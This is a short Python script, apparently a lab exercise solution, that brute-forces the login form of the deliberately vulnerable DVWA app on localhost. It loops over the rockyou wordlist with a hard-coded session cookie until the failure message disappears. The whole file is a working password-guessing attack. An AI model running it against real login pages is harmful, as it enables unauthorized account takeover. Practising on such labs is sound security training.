import requests

baseUrl = "http://localhost/DVWA/vulnerabilities/brute/?Login=Login&username=admin"

cookies = {
    "PHPSESSID": "91fdcd96e5376633ef607edd0a1b8093",
    "security": "medium"
}

try:    
    with open('/usr/share/wordlists/rockyou.txt') as file:
        for line in file:
            password = line.rstrip()
            url = baseUrl + f"&password={password}"
            
            try:
                print(f"Attempting: password={password}")
                res = requests.get(url, cookies=cookies)
                
                if "Username and/or password incorrect." not in res.text:
                    print()
                    print("=> Password found: ", password)
                    exit()
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                continue
except FileNotFoundError as e:
    print("File not found:", e)